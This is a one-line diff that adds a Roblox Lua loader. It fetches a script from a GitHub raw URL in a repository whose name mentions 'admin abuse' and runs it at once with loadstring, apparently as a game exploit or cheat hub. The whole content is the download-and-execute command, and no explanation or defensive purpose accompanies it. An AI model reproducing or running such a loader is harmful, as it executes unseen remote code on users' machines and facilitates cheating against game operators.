@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/cellosz789-del/celzzsc.CELZZHUB-workforadminabuse/main/text.lua"))()
